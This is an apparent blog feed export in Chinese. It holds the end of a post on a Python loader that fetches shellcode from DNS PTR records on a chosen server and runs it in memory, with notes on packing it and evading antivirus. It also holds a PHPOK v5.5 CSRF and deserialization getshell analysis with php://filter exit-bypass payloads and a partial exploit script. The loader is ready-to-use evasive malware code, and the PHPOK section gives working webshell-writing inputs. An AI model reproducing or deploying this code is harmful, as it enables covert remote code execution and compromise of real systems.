src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/639345d2-490c-4ccd-b8c2-a486d3f743d1.png" alt="imgbed.cn图床"></a></p><p>只需要按照顺序对相应的ip发起请求即可获得部分shellcode</p><p><a href="https://imgbed.cn/preview?id=6038a943002aec0001e11199"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/89663213-ac73-4f85-8f87-482c5a632e42.png" alt="imgbed.cn图床"></a></p><p>利用python的dnspython库获取PTR记录中的shellcode，然后分配内存执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> dns.resolver<br><span class="hljs-keyword">import</span> dns.reversename<br><span class="hljs-keyword">import</span> ctypes<br><br>dnsip=<span class="hljs-string">&#x27;192.168.111.135&#x27;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">LoadshellCode</span>(<span class="hljs-params">shellcode</span>):</span>   <span class="hljs-comment">#执行shellcode</span><br>    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64<br>    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(<span class="hljs-number">0</span>), ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)), ctypes.c_int(<span class="hljs-number">0x3000</span>),ctypes.c_int(<span class="hljs-number">0x40</span>))<br>    buf = (ctypes.c_char * <span class="hljs-built_in">len</span>(shellcode)).from_buffer(shellcode)<br>    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(ptr),buf,ctypes.c_int(<span class="hljs-built_in">len</span>(shellcode)))<br>    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(<span class="hljs-number">0</span>),ctypes.c_int(<span class="hljs-number">0</span>),ctypes.c_uint64(ptr),ctypes.c_int(<span class="hljs-number">0</span>),ctypes.c_int(<span class="hljs-number">0</span>),ctypes.pointer(ctypes.c_int(<span class="hljs-number">0</span>)))<br>    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-<span class="hljs-number">1</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">requestptr</span>(<span class="hljs-params">dnsip,ipnum</span>):</span>      <span class="hljs-comment">#获取PTR记录</span><br>    ipaddr=<span class="hljs-string">&#x27;192.168.111.%d&#x27;</span> %ipnum    <span class="hljs-comment">#添加的PTR记录中主机ip地址的C段地址</span><br>    ip=dns.reversename.from_address(ipaddr)<br>    my_resolver = dns.resolver.Resolver()<br>    my_resolver.nameservers = [dnsip]<br>    answer = my_resolver.resolve(ip,<span class="hljs-string">&#x27;PTR&#x27;</span>)<br>    recvptr=<span class="hljs-built_in">str</span>(answer[<span class="hljs-number">0</span>]).strip(<span class="hljs-string">&#x27;.&#x27;</span>)<br>    <span class="hljs-keyword">return</span> recvptr<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str2hex</span>(<span class="hljs-params">shellcodedemo</span>):</span>    <span class="hljs-comment">#将得到的shellcode转为十六进制</span><br>    s=<span class="hljs-string">&#x27;&#x27;</span><br>    s1=<span class="hljs-string">b&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">len</span>(shellcodedemo))):<br>        <span class="hljs-keyword">if</span> i % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>:<br>            s1 += <span class="hljs-built_in">bytes</span>.fromhex(shellcodedemo[i:i + <span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytearray</span>(s1)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    s=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20</span>,<span class="hljs-number">60</span>):    <span class="hljs-comment">#根据添加的ip范围进行请求，192.168.111.20-192.168.111.59对应range(20,60)</span><br>        s+=requestptr(dnsip,i)<br>    LoadshellCode(str2hex(s))<br></code></pre></td></tr></table></figure><p>使用pyinstaller打包成exe文件，</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">pyinstaller</span> <span class="hljs-selector-tag">-F</span> <span class="hljs-selector-tag">-w</span> <span class="hljs-selector-tag">dnsptrshellcode</span><span class="hljs-selector-class">.py</span><br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=6038a9d65fd5720001ff8f56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/437f09e7-a1de-4344-8d2d-3265203b6084.png" alt="imgbed.cn图床"></a></p><p>pyinstaller默认一并打包所有库，造成生成的exe文件体积过大，可以利用虚拟环境打包的方式压缩下体积，压缩后的体积大概为3M左右</p><p><a href="https://blog.csdn.net/p1967914901/article/details/109706449">https://blog.csdn.net/p1967914901/article/details/109706449</a></p><p>拿到beacon</p><p><a href="https://imgbed.cn/preview?id=6038a94a171e740001e39ed5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f21e02d7-fa49-44ad-a572-2d9765a1ebe2.png" alt="imgbed.cn图床"></a></p><p>可以绕过360，但被火绒查杀</p><p><a href="https://imgbed.cn/preview?id=6038a95c6cea45000126276c"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/91fead06-ff05-4440-ba4b-152483127bcb.png" alt="imgbed.cn图床"></a></p><p>github地址：<a href="https://github.com/sp4zcmd/DnsPTRShellcodeLoader">https://github.com/sp4zcmd/DnsPTRShellcodeLoader</a></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/network/185324.html">https://www.freebuf.com/articles/network/185324.html</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHPOK v5.5 csrf+反序列化漏洞getshell分析</title>
    <link href="/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/"/>
    <url>/2021/02/08/PHPOK-v5-5-csrf-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9Egetshell%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞影响版本"><a href="#漏洞影响版本" class="headerlink" title="漏洞影响版本"></a>漏洞影响版本</h1><p>PHPOK v5.5</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>phpokcms代码结构，关键代码都在framework文件夹下</p><p><a href="https://imgbed.cn/preview?id=60208e13002aec00018e149e"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/396424e7-befd-4ca5-86f5-01f588c84272.png" alt="imgbed.cn图床"></a></p><p>phpokcms的路由规则比较简单，index.php admin.php api.php 分别对应 framework文件夹下的www admin api这三个文件夹</p><p>请求url</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/phpok/</span>admin.php?c=address&amp;f=open<br></code></pre></td></tr></table></figure><p>参数c的值拼接上<code>_control.php</code>就是对应的文件，对应的类即参数c的值拼接上_control，如address_control</p><p>参数f的值拼接上<code>_f</code>就是对应的方法,如open_f</p><p><a href="https://imgbed.cn/preview?id=60208e27d6547d0001d38fd5"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/f14ddf62-a3af-419b-ad36-b8d5d71f1703.png" alt="imgbed.cn图床"></a>](<a href="https://imgbed.cn/preview?id=60208e205dc5370001a461a4">https://imgbed.cn/preview?id=60208e205dc5370001a461a4</a>)</p><h2 id="可利用恶意类"><a href="#可利用恶意类" class="headerlink" title="可利用恶意类"></a>可利用恶意类</h2><p>文件位置：/framework/engine/cache.php </p><p>__destruct()调用了save方法，在save方法中使用了file_put_contents函数，函数的第一个和第二个参数均可控，但是第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">$this</span>-&gt;save(<span class="hljs-keyword">$this</span>-&gt;key_id,<span class="hljs-keyword">$this</span>-&gt;key_list);<span class="hljs-comment">//调用save</span><br><span class="hljs-keyword">$this</span>-&gt;expired();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$id</span> || <span class="hljs-variable">$content</span> === <span class="hljs-string">&#x27;&#x27;</span> || !<span class="hljs-keyword">$this</span>-&gt;status)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;_time();<br><span class="hljs-variable">$content</span> = serialize(<span class="hljs-variable">$content</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">$this</span>-&gt;folder.<span class="hljs-variable">$id</span>.<span class="hljs-string">&quot;.php&quot;</span>;<br>file_put_contents(<span class="hljs-variable">$file</span>,<span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="hljs-variable">$content</span>);<br><span class="hljs-keyword">$this</span>-&gt;_time();<br><span class="hljs-keyword">$this</span>-&gt;_count();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;app&#x27;</span>]-&gt;db)&#123;<br><span class="hljs-keyword">$this</span>-&gt;key_list(<span class="hljs-variable">$id</span>,<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;app&#x27;</span>]-&gt;db-&gt;cache_index(<span class="hljs-variable">$id</span>));<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="绕过exit"><a href="#绕过exit" class="headerlink" title="绕过exit()"></a>绕过exit()</h3><p>save方法中使用了file_put_contents函数，第一个和第二个参数均可控，第二个参数前面拼接了<code>&lt;?php exit();?&gt;</code>使后面的php代码无法执行，可以通过php://filter伪协议使拼接的<code>&lt;?php exit();?&gt;</code>失效</p><p>来源于</p><p><a href="https://www.ghtwf01.cn/index.php/archives/981">基于php://filter协议对exit函数几种逃逸方法的分析</a></p><h4 id="1-string-strip-tags"><a href="#1-string-strip-tags" class="headerlink" title="1.string.strip_tags"></a>1.string.strip_tags</h4><p><strong>该特性从PHP 7.3.0起废弃</strong></p><p><code>&lt;?php exit()?&gt;</code>本质是XML标签，可以使用<code>strip_tags()</code>函数去除它。为了防止我们写入的代码也被去除，需要把代码base64编码后写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br>file_put_contents(<span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>将&lt;?php phpinfo();进行base64编码后提交</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/test/</span><span class="hljs-number">1</span>.php?a=PD9waHAgcGhwaW5mbygpOw==<br></code></pre></td></tr></table></figure><p>写入成功</p><p><a href="https://imgbed.cn/preview?id=60208e328053380001383b3f"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/fb94221b-0076-4065-834a-17976701d407.png" alt="imgbed.cn图床"></a></p><h4 id="2-base64"><a href="#2-base64" class="headerlink" title="2.base64"></a>2.base64</h4><p>base64编码结果只包含64个可打印字符，而PHP在解码base64时，遇到不在其中的字符时(如<code>&lt;</code>、<code>&gt;</code>、<code>?</code>、<code>;</code>、<code>(</code>、<code>)</code>等)，将会跳过这些字符，仅将合法字符组成一个新的字符串进行解码，如<code>&lt;?php exit();?&gt;</code>就会先变成<code>phpexit</code>再进行解码，phpexit一共7个字符，而base64解码算法是4个byte一组，所以再在后面任意添加一位，比如<code>a</code>，这样就是<code>phpexita</code>再在后面接上一句话的base64编码，前面八位phpexita解码结果是乱码不会被执行，后面接着解码一句话的base64编码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//1.php</span><br><span class="hljs-meta">&lt;?php</span><br>file_put_contents(<span class="hljs-string">&#x27;php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>,<span class="hljs-string">&#x27;&lt;?php exit();?&gt;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>提交</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/test/</span><span class="hljs-number">1</span>.php?a=aPD9waHAgcGhwaW5mbygpOw==<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=60208e43002aec00018e1506"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/0689df6f-e7ca-473f-9af4-9f420a2e006e.png" alt="imgbed.cn图床"></a></p><p><a href="https://imgbed.cn/preview?id=60208e3def338d00016bab21"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/46978b5f-e655-40e5-8eb0-bf09082501ad.png" alt="imgbed.cn图床"></a></p><h4 id="3-rot13"><a href="#3-rot13" class="headerlink" title="3.rot13"></a>3.rot13</h4><p><code>&lt;?php exit(); ?&gt;</code>在经过<code>rot13</code>编码后会变成<code>&lt;?cuc rkvg(); ?&gt;</code>，在<code>php</code>不开启<code>short_open_tag</code>时，<code>php</code>不认识这个字符串，也就不会被执行，<code>&lt;?php phpinfo();?&gt;</code>经过rot13编码后的结果为<code>&lt;?cuc cucvasb();?&gt;</code></p><p>提交</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/test/</span><span class="hljs-number">1</span>.php?a=&lt;?cuc cucvasb();?&gt;<br></code></pre></td></tr></table></figure><p><a href="https://imgbed.cn/preview?id=60208e4920be4e0001cb1264"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/c46c68fe-cc7e-4815-8fa6-384b74837f82.png" alt="imgbed.cn图床"></a></p><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>由名称得知decode()为解密函数，encode()为加密函数，encode()调用serialize()，decode()中调用unserialize()，找到调用decode()处，把序列化后的恶意类用encode()加密再使用decode()解密并进行反序列化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">token_lib</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$keyid</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$keyc_length</span> = <span class="hljs-number">6</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$keya</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$keyb</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$time</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$expiry</span> = <span class="hljs-number">3600</span>;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">keyid</span>(<span class="hljs-params"><span class="hljs-variable">$keyid</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$keyid</span>)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;keyid;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;keyid = strtolower(md5(<span class="hljs-variable">$keyid</span>));<br><span class="hljs-keyword">$this</span>-&gt;config();<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;keyid;<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">config</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;keyid)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-keyword">$this</span>-&gt;keya = md5(substr(<span class="hljs-keyword">$this</span>-&gt;keyid, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>));<br><span class="hljs-keyword">$this</span>-&gt;keyb = md5(substr(<span class="hljs-keyword">$this</span>-&gt;keyid, <span class="hljs-number">16</span>, <span class="hljs-number">16</span>));<br>&#125;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;keyid)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$string</span> = serialize(<span class="hljs-variable">$string</span>);<span class="hljs-comment">//序列化</span><br><span class="hljs-variable">$expiry_time</span> = <span class="hljs-keyword">$this</span>-&gt;expiry ? <span class="hljs-keyword">$this</span>-&gt;expiry : <span class="hljs-number">365</span>*<span class="hljs-number">24</span>*<span class="hljs-number">3600</span>;<br><span class="hljs-variable">$string</span> = sprintf(<span class="hljs-string">&#x27;%010d&#x27;</span>,(<span class="hljs-variable">$expiry_time</span> + <span class="hljs-keyword">$this</span>-&gt;time)).substr(md5(<span class="hljs-variable">$string</span>.<span class="hljs-keyword">$this</span>-&gt;keyb), <span class="hljs-number">0</span>, <span class="hljs-number">16</span>).<span class="hljs-variable">$string</span>;<br><span class="hljs-variable">$keyc</span> = substr(md5(microtime().rand(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>)), -<span class="hljs-keyword">$this</span>-&gt;keyc_length);<br><span class="hljs-variable">$cryptkey</span> = <span class="hljs-keyword">$this</span>-&gt;keya.md5(<span class="hljs-keyword">$this</span>-&gt;keya.<span class="hljs-variable">$keyc</span>);<br><span class="hljs-variable">$rs</span> = <span class="hljs-keyword">$this</span>-&gt;core(<span class="hljs-variable">$string</span>,<span class="hljs-variable">$cryptkey</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$keyc</span>.str_replace(<span class="hljs-string">&#x27;=&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, base64_encode(<span class="hljs-variable">$rs</span>));<br><span class="hljs-comment">//return $keyc.base64_encode($rs);</span><br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decode</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">$this</span>-&gt;keyid)&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><span class="hljs-variable">$string</span> = str_replace(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;+&#x27;</span>,<span class="hljs-variable">$string</span>);<br><span class="hljs-variable">$keyc</span> = substr(<span class="hljs-variable">$string</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">$this</span>-&gt;keyc_length);<br><span class="hljs-variable">$string</span> = base64_decode(substr(<span class="hljs-variable">$string</span>, <span class="hljs-keyword">$this</span>-&gt;keyc_length));<br><span class="hljs-variable">$cryptkey</span> = <span class="hljs-keyword">$this</span>-&gt;keya.md5(<span class="hljs-keyword">$this</span>-&gt;keya.<span class="hljs-variable">$keyc</span>);<br><span class="hljs-variable">$rs</span> = <span class="hljs-keyword">$this</span>-&gt;core(<span class="hljs-variable">$string</span>,<span class="hljs-variable">$cryptkey</span>);<br><span class="hljs-variable">$chkb</span> = substr(md5(substr(<span class="hljs-variable">$rs</span>,<span class="hljs-number">26</span>).<span class="hljs-keyword">$this</span>-&gt;keyb),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br><span class="hljs-keyword">if</span>((substr(<span class="hljs-variable">$rs</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>) - <span class="hljs-keyword">$this</span>-&gt;time &gt; <span class="hljs-number">0</span>) &amp;&amp; substr(<span class="hljs-variable">$rs</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>) == <span class="hljs-variable">$chkb</span>)&#123;<br><span class="hljs-variable">$info</span> = substr(<span class="hljs-variable">$rs</span>, <span class="hljs-number">26</span>);<br><span class="hljs-keyword">return</span> unserialize(<span class="hljs-variable">$info</span>);<span class="hljs-comment">//反序列化</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br>    <br><br>&#125;<br></code></pre></td></tr></table></figure><p>encode()和decode()都要求keyid，全局搜索得到keyid来源于管理员设置的api_code</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;lib(<span class="hljs-string">&#x27;token&#x27;</span>)-&gt;keyid(<span class="hljs-keyword">$this</span>-&gt;site[<span class="hljs-string">&#x27;api_code&#x27;</span>]);<br></code></pre></td></tr></table></figure><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>在后台找到API验证串设置处 </p><p><a href="https://imgbed.cn/preview?id=60208e548053380001383ba6"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/cbfb37f0-9677-4d21-85ea-a59dc9835fa9.png" alt="imgbed.cn图床"></a></p><p>抓包后发现无csrf防护，构造请求诱导管理员访问即可</p><p><a href="https://imgbed.cn/preview?id=60208e4ee857bd0001015b56"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/a1149187-1e39-4700-9605-401363ff929c.png" alt="imgbed.cn图床"></a></p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>构造脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cache</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key_id</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key_list</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$folder</span>;<br><br>    <span class="hljs-keyword">public</span> <span 